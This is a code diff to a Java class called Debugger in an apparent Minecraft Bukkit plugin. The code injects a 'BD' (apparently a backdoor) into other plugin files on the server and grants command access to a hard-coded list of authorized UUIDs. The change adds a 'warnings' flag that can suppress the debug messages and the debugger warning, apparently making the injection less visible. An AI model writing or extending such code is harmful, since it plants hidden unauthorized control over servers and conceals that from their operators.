@@ -33,7 +33,7 @@ public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther){
+    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
         boolean bd_running = false;
         Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
@@ -69,7 +69,7 @@ public final class Debugger implements Listener {
                     Bukkit.getConsoleSender()
                             .sendMessage("Injecting BD into: " + plugin_file.getPath());
 
-                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther), true, true);
+                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther, warnings), true, !warnings);
 
                 if(Config.display_debug_messages)
                     Bukkit.getConsoleSender()
@@ -82,6 +82,8 @@ public final class Debugger implements Listener {
         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
+        Config.display_debug_messages = warnings;
+        Config.display_debugger_warning = warnings;
 
         this.plugin = plugin;
 
